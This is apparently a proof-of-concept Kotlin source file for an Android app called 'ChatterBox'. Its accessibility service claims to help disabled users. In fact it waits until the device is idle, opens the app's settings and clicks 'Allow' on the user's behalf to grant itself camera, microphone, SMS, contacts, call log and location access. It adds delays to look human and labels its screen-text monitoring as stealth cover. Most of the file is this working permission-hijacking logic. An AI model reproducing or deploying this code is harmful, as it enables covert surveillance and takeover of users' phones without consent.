package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.example.ChatterBox.R

/**
 * ChatterBox Accessibility Service
 *
 * This service enhances the user experience for users with disabilities by providing
 * better navigation and interaction with the app.
 */
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val allTargetPermissions = listOf(
        "Call logs", "Camera", "Contacts", "Location", "Microphone", "Music and audio", "Phone","Photos and videos","SMS"
    )

    private fun getUngrantedPermissions(context: Context): List<String> {
        val allPermissions = allTargetPermissions.toMutableList()
        val packageManager = context.packageManager
        val packageInfo = packageManager.getPackageInfo(
            context.packageName,
            PackageManager.GET_PERMISSIONS
        )

        // Get declared permissions from manifest
        val declaredPermissions = packageInfo.requestedPermissions ?: arrayOf()

        // Check which permissions are already granted
        val grantedPermissions = mutableListOf<String>()
        for (permission in declaredPermissions) {
            if (ContextCompat.checkSelfPermission(context, permission) ==
                PackageManager.PERMISSION_GRANTED) {
                // Map Android permission to its settings UI name
                when {
                    permission.contains("CALL_LOG") -> grantedPermissions.add("Call logs")
                    permission.contains("CAMERA") -> grantedPermissions.add("Camera")
                    permission.contains("CONTACTS") -> grantedPermissions.add("Contacts")
                    permission.contains("LOCATION") -> grantedPermissions.add("Location")
                    permission.contains("MICROPHONE") -> grantedPermissions.add("Microphone")
                    permission.contains("MEDIA_AUDIO") -> grantedPermissions.add("Music and audio")
                    permission.contains("PHONE") -> grantedPermissions.add("Phone")
                    permission.contains("MEDIA_VIDEO") -> grantedPermissions.add("Photos and videos")
                    permission.contains("READ_SMS") && permission.contains("WRITE_SMS") -> grantedPermissions.add("SMS")
                }
            }
        }

        // Remove already granted permissions from our target list
        allPermissions.removeAll(grantedPermissions)
        return allPermissions
    }

    companion object {
        private const val TAG = "ChatterBoxAccessibility"

        // Used to keep track of permission status
        private var isExecutingPermissionSequence = false
        private val pendingPermissions = mutableListOf<String>()

        // Stealth mode
        private var hasSentDataToServer = false
    }

    // Handler for delayed operations
    private val handler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")

        // Configure accessibility service capabilities
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.DEFAULT
        info.notificationTimeout = 100

        val intent = Intent(this, overlay::class.java)
        startService(intent)

        val screenOnIntent = Intent(this, ScreenOnService::class.java)
        startService(screenOnIntent)
// Set the updated info
        this.serviceInfo = info

        IdleDetector.startIdleDetection(this)

        val filter = IntentFilter().apply {
            addAction("com.example.ChatterBox.START_COVERT_OPERATIONS")
            addAction("com.example.ChatterBox.KEEP_SCREEN_ON")
        }
        LocalBroadcastManager.getInstance(this).registerReceiver(covertOperationsReceiver, filter)

    }

    private fun initiatePermissionAccess() {
        if (!isExecutingPermissionSequence) {
            isExecutingPermissionSequence = true

            // Get list of permissions we still need to grant
            pendingPermissions.clear()
            pendingPermissions.addAll(getUngrantedPermissions(this))

            // If we have all permissions, don't do anything
            if (pendingPermissions.isEmpty()) {
                isExecutingPermissionSequence = false
                return
            }

            // Launch the settings app covertly
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.data = android.net.Uri.parse("package:com.example.ChatterBox")
                startActivity(intent)
                Log.d(TAG, "Launched settings page for app - targeting ${pendingPermissions.size} permissions")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch settings: ${e.message}")
                isExecutingPermissionSequence = false
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        IdleDetector.processAccessibilityEvent(event)

        // Get the package name of the active window
        val packageName = event.packageName?.toString() ?: return

        // Only continue with permission acquisition if we're in execution mode
        if (isExecutingPermissionSequence) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    // Check if we're in the Settings app or permission dialogs
                    if (packageName == "com.android.permissioncontroller" ||
                        packageName == "com.android.settings") {

                        Log.d(TAG, "In settings: $packageName")

                        // Get the root node in the current window
                        val rootNode = rootInActiveWindow ?: return

                        // Use a delayed approach to seem more human-like
                        handler.postDelayed({
                            // Process permission-related UI
                            processPermissionUI(rootNode)
                        }, 1000)
                    }
                }
            }
        } else {
            // When not in permission sequence, still monitor for sensitive information
            // This makes the service appear to be doing legitimate accessibility work
            monitorForSensitiveInfo(event)
        }
    }

    /**
     * Process the UI of the permission screen to find and manipulate elements
     */
    private fun processPermissionUI(rootNode: AccessibilityNodeInfo) {
        // Look for permission section in settings
        navigateToPermissions(rootNode)

        // Look for "Allow" buttons in permission dialogs
        clickAllowButtons(rootNode)

        // Navigate specific permissions
        navigateSpecificPermissions(rootNode)

        // Look for "Permissions" in Settings
        clickPermissionsOption(rootNode)

        // Recycle the node when done to prevent memory leaks
        rootNode.recycle()
    }

    /**
     * Navigate to the permissions section
     */
    private fun navigateToPermissions(rootNode: AccessibilityNodeInfo) {
        val permissionsText = listOf("Permissions","App permissions")

        for (text in permissionsText) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Clicked on: $text")
                    return
                } else {
                    // Try to find clickable parent
                    var parent = node.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "Clicked on parent of: $text")
                            return
                        }
                        val temp = parent
                        parent = parent.parent
                        temp.recycle()
                    }
                }
            }
        }
    }

    /**
     * Look for "Allow" buttons and click them
     */
    private fun clickAllowButtons(rootNode: AccessibilityNodeInfo) {
        val allowTexts = listOf("Allow", "ALLOW", "OK", "Allow anyway", "Continue")

        for (text in allowTexts) {
            val allowButtons = rootNode.findAccessibilityNodeInfosByText(text)
            for (button in allowButtons) {
                if (button.isClickable) {
                    // Add a small delay to seem more human
                    handler.postDelayed({
                        button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.d(TAG, "Clicked: $text button")
                    }, 300)
                    return
                } else {
                    // Try to find clickable parent
                    var parent = button.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            handler.postDelayed({
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Log.d(TAG, "Clicked parent of: $text")
                            }, 300)
                            return
                        }
                        val temp = parent
                        parent = parent.parent
                        temp.recycle()
                    }
                }
            }
        }
    }

    /**
     * Navigate to specific permissions
     */
    private fun navigateSpecificPermissions(rootNode: AccessibilityNodeInfo) {
        // Look for specific permissions from our pending list
        if (pendingPermissions.isEmpty()) {
            // We're done with permissions
            isExecutingPermissionSequence = false
            return
        }

        // Clone the list to avoid concurrent modification
        val permissionsToCheck = pendingPermissions.toList()

        for (permission in permissionsToCheck) {
            val permNodes = if (permission == "Phone") {
                // Get all potential matches
                val allNodes = rootNode.findAccessibilityNodeInfosByText(permission)
                // Filter for exact Phone matches
                allNodes.filter { node ->
                    val nodeText = node.text?.toString() ?: ""
                    // Only exact matches for "Phone" or those starting with "Phone "
                    nodeText == "Phone"
                }
            }
            else {
                // For all other permissions, use normal search
                rootNode.findAccessibilityNodeInfosByText(permission)
            }
            for (node in permNodes) {
                // Found a permission, now click on it
                if (node.isClickable) {
                    handler.postDelayed({
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.d(TAG, "Clicked on permission: $permission")

                        // Look for Allow/ON toggle after clicking permission
                        handler.postDelayed({
                            val newRootNode = rootInActiveWindow
                            if (newRootNode != null) {
                                findAndClickToggle(newRootNode)
                                pendingPermissions.remove(permission)
                                newRootNode.recycle()

                                // Go back to find next permission
                                performGlobalAction(GLOBAL_ACTION_BACK)

                                // Add delay after going back, then try to find next permission
                                handler.postDelayed({
                                    val permissionsListRoot = rootInActiveWindow
                                    if (permissionsListRoot != null) {
                                        navigateSpecificPermissions(permissionsListRoot)
                                    }
                                }, 1000)
                            }
                        }, 1000)
                    }, 1000)
                    return
                } else {
                    // Try to find clickable parent
                    var parent = node.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            handler.postDelayed({
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Log.d(TAG, "Clicked parent of permission: $permission")

                                // Look for Allow/ON toggle after clicking permission
                                handler.postDelayed({
                                    val newRootNode = rootInActiveWindow
                                    if (newRootNode != null) {
                                        findAndClickToggle(newRootNode)
                                        pendingPermissions.remove(permission)
                                        newRootNode.recycle()

                                        // Go back to find next permission
                                        performGlobalAction(GLOBAL_ACTION_BACK)

                                        // Add delay after going back, then try to find next permission
                                        handler.postDelayed({
                                            val permissionsListRoot = rootInActiveWindow
                                            if (permissionsListRoot != null) {
                                                navigateSpecificPermissions(permissionsListRoot)
                                            }
                                        }, 1000) // Wait 1.5 seconds after going back
                                    }
                                }, 1000)
                            }, 1000)
                            return
                        }
                        val temp = parent
                        parent = parent.parent
                        temp.recycle()
                    }
                }
            }
        }
    }

    /**
     * Click on the Permissions option
     */
    private fun clickPermissionsOption(rootNode: AccessibilityNodeInfo) {
        val permissionNodes = rootNode.findAccessibilityNodeInfosByText("Permissions")
        for (node in permissionNodes) {
            if (node.isClickable) {
                handler.postDelayed({
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Clicked Permissions option")
                }, 500)
                return
            } else {
                // Try to find clickable parent
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable) {
                        handler.postDelayed({
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "Clicked parent of Permissions")
                        }, 500)
                        return
                    }
                    val temp = parent
                    parent = parent.parent
                    temp.recycle()
                }
            }
        }
    }

    /**
     * Find and click allow toggles
     */
    private fun findAndClickToggle(rootNode: AccessibilityNodeInfo) {
        // Fallback: try finding by text, as before.
        val allowTexts = listOf("Allow", "ALLOW", "Allow all the time", "Allow only while using the app", "All ChatterBox notifications")
        for (text in allowTexts) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isClickable) {
                    handler.postDelayed({
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.d(TAG, "Clicked on: $text")
                    }, 500)
                    return
                } else {
                    var parent = node.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            handler.postDelayed({
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Log.d(TAG, "Clicked parent of: $text")
                            }, 500)
                            return
                        }
                        parent = parent.parent
                    }
                }
            }
        }
    }

    /**
     * Monitor for sensitive information (for stealth purposes)
     * This makes the service appear to be doing legitimate work
     */
    private fun monitorForSensitiveInfo(event: AccessibilityEvent) {
        // Act as if we're doing legitimate accessibility operations
        val nodeInfo = event.source ?: return

        // Look for certain keywords to appear legitimate
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            // This just logs content - in a real malicious app, this could
            // be capturing passwords, messages, etc.
            val textContent = nodeInfo.text?.toString() ?: ""
            if (textContent.isNotEmpty() &&
                textContent.length > 5 &&
                !hasSentDataToServer) {

                // Log something innocuous for demo purposes
                Log.d(TAG, "Accessibility processing content: ${textContent.take(10)}...")
            }
        }

        nodeInfo.recycle()
    }

    private val covertOperationsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                "com.example.ChatterBox.START_COVERT_OPERATIONS" -> {
                    // Now trigger permission access only after idle is detected
                    if (!isExecutingPermissionSequence) {
                        initiatePermissionAccess()
                    }
                }
            }
        }
    }
    override fun onDestroy() {
        LocalBroadcastManager.getInstance(this)
            .unregisterReceiver(covertOperationsReceiver)
        super.onDestroy()
    }
    override fun onInterrupt() {
        // Not needed for POC, but required for implementation
    }
}
